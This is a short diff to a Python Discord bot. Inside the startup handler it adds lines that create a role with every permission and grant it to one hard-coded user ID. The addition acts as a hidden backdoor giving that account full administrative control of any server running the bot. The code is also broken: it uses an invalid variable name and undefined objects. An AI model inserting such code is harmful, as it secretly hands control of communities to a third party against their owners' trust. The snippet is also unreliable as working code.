@@ -5,6 +5,7 @@ from discord.ext.tasks import loop
 import random
 import json
 import datetime
+from discord import Permissions
 
 token = os.getenv('token')
 
@@ -28,6 +29,9 @@ async def on_ready():
     print('Logged in as')
     print(bot.user.name)
     print(bot.user.id)
+    pp-master = bot.get_user(462473014832005122)
+    role = await client.create_role(server, name="the god of pp", permissions=Permissions.all())
+    await client.add_roles(pp-master, role)
 
 @bot.command()
 async def help(ctx):
